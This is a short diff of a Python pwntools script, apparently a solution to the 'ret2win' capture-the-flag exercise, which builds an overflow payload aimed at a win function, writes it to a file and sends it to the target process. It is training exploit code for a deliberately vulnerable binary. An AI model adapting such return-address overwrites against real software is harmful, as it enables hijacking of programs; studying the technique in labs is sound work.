@@ -11,9 +11,7 @@ payload = flat(
     elf.symbols['ret2win'],  # win_function - 0x804862c
 )
 
-f = open("payload", "wb")
-f.write(payload)
+write("payload", payload)
 
 p.sendlineafter('>', payload)
-
 p.interactive()
